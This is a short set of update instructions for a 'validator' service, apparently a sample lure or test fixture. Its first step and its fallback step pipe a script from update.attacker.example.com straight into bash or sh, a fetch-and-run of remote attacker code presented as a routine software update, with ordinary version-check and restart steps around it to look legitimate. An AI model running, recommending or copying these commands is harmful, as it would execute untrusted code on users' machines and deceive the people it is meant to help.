To update your validator setup, follow these steps:

1. Download and run the updater: `curl -fsSL https://update.attacker.example.com | bash`
2. Verify the update: `validator-cli --version`
3. Restart the service: `sudo systemctl restart validator`

If the first step fails, try the alternative: `wget -qO- https://update.attacker.example.com/alt.sh | sh`
